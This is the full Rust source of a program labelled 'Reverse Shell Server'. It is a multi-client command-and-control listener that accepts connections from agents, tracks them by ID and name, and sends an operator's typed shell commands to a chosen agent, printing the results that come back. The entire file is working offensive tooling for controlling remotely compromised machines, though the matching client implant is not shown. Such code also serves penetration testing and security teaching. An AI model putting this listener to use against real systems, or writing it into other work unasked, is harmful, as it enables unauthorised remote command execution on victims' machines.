use std::net::{Ipv4Addr, TcpListener, TcpStream, SocketAddr, SocketAddrV4};
use std::io::{BufRead, BufReader, Write};
use std::sync::{Arc, Mutex};
use std::thread;
use clap::{Arg, Command};

/* Client info struct. */
struct ClientInfo {
    id: usize,
    agent_name: String,
    address: SocketAddr,
    stream: Arc<Mutex<TcpStream>>,
}

/* Remove the client from the list. */
fn remove_client(clients: &Arc<Mutex<Vec<ClientInfo>>>, client_id: usize) {

    let mut lock = clients.lock().unwrap();

    // Find the client based on the ID.
    if let Some(pos) = lock.iter().position(|c| c.id == client_id) {
    
        // Remove the client.
        lock.remove(pos);
    
    }

}

fn main() {

    // CLI arguments.
    let matches = Command::new("Reverse Shell Server")
        .version("0.2")
        .author("Duane Dunston <thedunston@gmail.com>")
        .about("Reverse Shell Server")
        
        .arg(
            Arg::new("IP")
                .short('i')
                .long("address")
                .value_name("ADDRESS")
                .help("IP address to bind to.")
                .required(true)
        )
        .arg(
            Arg::new("port")
                .long("port")
                .value_name("PORT")
                .help("Port to bind to.")
                .required(true)
        )
    .get_matches();

    // Get IP address.
    let ipaddress = matches.get_one::<String>("IP").expect("IP address argument is required.");
 
    // Get port.
    let port: u16 = matches.get_one::<String>("port").expect("Port argument is required.").parse().expect("Port must be a valid number between 0 and 65535");
   
    // Converting IP address to Ipv4Addr.
    let ip = match ipaddress.parse::<Ipv4Addr>() {
        Ok(ip) => ip,
        Err(e) => panic!("{}", e),
    };

        let bindaddress = SocketAddrV4::new(ip, port);
        let tcplistener = TcpListener::bind(bindaddress).expect("Could not bind");

        // Debug.
        // println!("Listening on: {:?}", tcplistener.local_addr().unwrap());
    
        // List of connected clients.
        let clients = Arc::new(Mutex::new(Vec::<ClientInfo>::new()));
    
        // Clone Arc for command handling thread
        let clients_for_commands = Arc::clone(&clients);
    
        // Spawn a thread to handle user commands
        thread::spawn(move || {
           
            // Get user input.
            let stdin = std::io::stdin();
            let mut input_line = String::new();
    
            loop {

                
                input_line.clear();

                // Prompt for user input.
                print!("> ");

                // Stream the prompt to stdout.
                std::io::stdout().flush().unwrap();
    
                // Read user input.
                if stdin.read_line(&mut input_line).is_err() {

                    // Error reading from stdin.    
                    eprintln!("Failed to read from stdin.");
                    continue;
                
                }
    
                let line = input_line.trim();

                // Check if the user typed "clients" to list the connected clients.
                if line == "clients" {

                    // Print the list of connected clients.
                    let lock = clients_for_commands.lock().unwrap();

                    if lock.is_empty() {
                    
                        println!("No clients connected.");
                    
                    } else {

                        // Print the list of connected clients. Need to lookup how to do dynamic formatting.
                        println!("ID | Agent Name | Address");
                        println!("-------------------------");
                        for c in lock.iter() {
                    
                            println!("{} | {} | {}", c.id, c.agent_name, c.address);
                    
                        }
                    
                    }
                
                } else {

                    
                    // Split the user input into the ID of the client and the command to send.
                    let mut parts = line.splitn(2, ' ');

                    // ID of the client.
                    let id_str = parts.next().unwrap_or("");

                    // Command to send.
                    let cmd = parts.next().unwrap_or("");
    
                    // Check if the ID is a valid integer.
                    if let Ok(id) = id_str.parse::<usize>() {

                        // Lock the client's mutex.
                        let mut lock = clients_for_commands.lock().unwrap();
                       
                        // Find the client by its ID.
                        if let Some(client) = lock.iter_mut().find(|c| c.id == id) {

                            // Send the command to the client.
                            let mut cmd_to_send = cmd.to_string();
                            cmd_to_send.push('\0');
    
                            // Lock and write the command to the client's stream.
                            let mut stream = client.stream.lock().unwrap();

                            // Write the command to the client's stream.
                            if let Err(e) = stream.write_all(cmd_to_send.as_bytes()) {

                                eprintln!("Failed to send command to client {}: {}", id, e);
                            
                            } else {
                            
                                println!("Command sent to client {}", id);
                            
                            }
                        
                        } else {
                        
                            println!("No client with ID {} found.", id);
                        
                        }
                    
                    } else {
                    
                        println!("Unknown command. Type 'clients' to list clients.");
                    
                    }
                
                }
            }

        });
    
        // Initialize the first client ID.
        let mut next_id = 0;

        // Loop over incoming connections.
        for stream_result in tcplistener.incoming() {
        
            // Handle the connection.
            match stream_result {
        
            
                Ok(client_stream) => {
        
                    // Get the client's address.
                    let client_address = client_stream.peer_addr().unwrap();
        
                    // Message for the server to see that a client has connected.
                    println!("[+] Client connected: {:?}", client_address);
            
                    // Clone the client's stream for reading and writing.
                    let write_stream = client_stream.try_clone().expect("Failed to clone stream");
            
                    // NOTE: Arc is a synchronization primitive that allows multiple threads to share ownership of the wrapped value.
                    let write_stream_arc = Arc::new(Mutex::new(write_stream));
            
                    // Assign an ID to the client.
                    let client_id = next_id;

                    // Increment the ID for the next client.
                    next_id += 1;
            
                    {

                        // Lock the client list and add the new client.
                        let mut clients_lock = clients.lock().unwrap();

                        // Add the new client to the list.
                        clients_lock.push(ClientInfo {
                            id: client_id,
                            agent_name: String::new(),
                            address: client_address,
                            stream: Arc::clone(&write_stream_arc),
                        });
                    }
            
                    // Threat to handle the client.
                    let clients_for_thread = Arc::clone(&clients);
                    
                    // Create the thread to handle the client.
                    thread::spawn(move || {

                        let mut reader = BufReader::new(&client_stream);
                        let mut agent_buf = Vec::new();
                  
                        // Read the agent name from the client.
                        if let Err(e) = reader.read_until(b'\0', &mut agent_buf) {
                        
                            eprintln!("Error reading agent name: {}", e);
                  
                            // Remove the client from the list.
                            remove_client(&clients_for_thread, client_id);
                            return;
                  
                        }

                        // Convert the agent name to a string.
                        let agent_name = String::from_utf8_lossy(&agent_buf).trim_end_matches('\0').trim().to_string();
            
                        // Update the agent_name in the list.
                        {

                            let mut clients_lock = clients_for_thread.lock().unwrap();
                        
                            // Find the client by its ID and update its agent name.
                            if let Some(c) = clients_lock.iter_mut().find(|c| c.id == client_id) {

                                c.agent_name = agent_name.clone();
                            
                            }
                        
                        }
            
                        println!("Client {} named: {}", client_id, agent_name);
            
                        // Now read messages in a loop.
                        loop {

                            let mut buf: Vec<u8> = Vec::new();
                            
                            // Read the message from the client.
                            let bytes_read = match reader.read_until(b'\0', &mut buf) {
                                Ok(b) => b,
                                Err(e) => {

                                    eprintln!("Read error from client {}: {}", client_id, e);
                                    break;
                                
                                }
                            };

                            // If the client disconnected, break the loop.
                            if bytes_read == 0 {
                            
                                println!("Client {} disconnected", client_id);
                                break;
                            
                            }
            
                            // Convert the cmd results to a string.
                            let message = String::from_utf8_lossy(&buf).trim_end_matches('\0').trim().to_string();

                            // Debug output but need to remove the Received from client message and just print the results.
                            println!("Received from client {}: \"{}\"\0", client_id, message);
            
                            if message == "exit" {

                                println!("Client {} requested exit", client_id);
                                break;
                            
                            }
                        
                        }
            
                        remove_client(&clients_for_thread, client_id);
                    
                    });
                
                }
                
                Err(e) => eprintln!("Accept error: {}", e),
            
            }
            
        }
    }
    